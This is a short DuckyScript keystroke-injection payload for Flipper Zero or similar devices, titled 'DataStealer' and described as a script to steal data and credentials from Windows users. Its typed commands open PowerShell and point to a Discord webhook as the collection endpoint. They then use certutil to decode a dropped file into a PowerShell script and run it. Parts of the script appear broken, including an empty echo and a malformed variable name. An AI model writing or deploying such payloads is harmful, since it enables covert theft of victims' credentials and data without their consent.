REM Title      : DataStealer
REM Description: Script that steal data from a user 
REM Author     : I.Pearce
REM Version    : 1.1
REM Category Credentials
REM Compatibility: Flipper zero And DuckyScript Devices
REM Target: Windows 

REM To use on a Flipper Zero REM the DUCKY_LANG US from line below
REM DUCKY DUCKY_LANG US
DELAY 2000
GUI r
DELAY 200
STRING powershell
DELAY 500
ENTER
DELAY 2000
STRING $ webhook = "https://discord.com/channels/1287714429680619563/1287714727556022344" 
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo  > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
